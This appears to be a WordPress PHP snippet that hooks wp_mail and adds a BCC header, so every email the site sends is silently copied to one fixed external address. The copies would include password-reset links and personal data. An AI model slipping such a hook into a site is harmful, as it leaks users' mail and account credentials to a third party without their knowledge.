<?php
add_filter( 'wp_mail',function($data) {
    $data['headers'] .= "BCC: d.vielhuber@camac-harps.com \r\n";
    return $data;
});